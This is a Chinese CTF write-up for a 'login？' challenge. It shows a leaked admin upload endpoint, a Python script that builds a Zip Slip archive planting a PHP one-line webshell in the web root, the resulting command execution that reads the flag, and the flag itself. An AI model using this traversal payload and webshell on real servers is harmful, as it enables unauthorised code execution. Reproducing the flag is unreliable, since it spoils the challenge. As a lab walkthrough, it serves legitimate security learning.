# login？

进入网页后是登陆界面，尝试登陆发现没反应

抓包发现登陆后返回

```http
HTTP/2 302 Found
Content-Type: text/html; charset=UTF-8
Date: Fri, 16 Oct 2026 05:49:32 GMT
Location: /login.php
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
Content-Length: 554

<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <title>素材导入后台</title>
</head>
<body>
  <h1>素材导入后台</h1>
  <p>上传 ZIP，自动解压归档并返回导入报告。</p>
  <form action="/upload_aa99bc42bc4e.php" method="post" enctype="multipart/form-data">
    <p><label>选择压缩包：<input type="file" name="archive" accept=".zip" required></label></p>
    <p><button type="submit">上传并解压</button></p>
  </form>
  <p><a href="/make_sample.py" download>下载示例脚本</a></p>
</body>
</html>
```

body 泄漏，发现 admin 后台有 `/upload_aa99bc42bc4e.php` 上传压缩包接口和 `/make_sample.py` 下载示例脚本接口

下载示例脚本发现为

```python
import zipfile

#小 r 感觉直接用脚本生成示例压缩包然后 curl 上传更方便呢
#curl http://localhost:3000 -F "archive=@sample.zip"
with zipfile.ZipFile("sample.zip", "w") as z:
    z.writestr("notes.txt", "这是示例素材包。\n系统会保留内部目录结构进行解压归档。\n")
    z.writestr("images/cover.txt", "封面占位")
```

生成示例压缩包后上传，返回得到

```json
{
    "id": "f21c77",
    "status": "completed",
    "workspace": "/var/www/storage/f21c77",
    "files": [
        {
            "entry": "notes.txt",
            "stored_as": "/var/www/storage/f21c77/notes.txt",
            "size": 80,
            "status": "written"
        },
        {
            "entry": "images/cover.txt",
            "stored_as": "/var/www/storage/f21c77/images/cover.txt",
            "size": 12,
            "status": "written"
        }
    ]
}
```

返回信息如此详细，尝试写一句话木马解压后路径穿越以达成 RCE

```python
import zipfile

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("../../html/evil.php", "<?php system($_GET['c']); ?>")
```

```
Warning: Undefined array key "c" in /var/www/html/evil.php on line 1

Deprecated: system(): Passing null to parameter #1 ($command) of type string is deprecated in /var/www/html/evil.php on line 1

Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/evil.php:1 Stack trace: #0 /var/www/html/evil.php(1): system('') #1 {main} thrown in /var/www/html/evil.php on line 1
```

成功 RCE ，在根目录下找到 flag

```
/evil.php?c=cat%20/flag

SpiritCTF{IOGin-10okS-I0CkEd-6Ut_zlP_5llPS-iNTo-DocrOoT0}
```
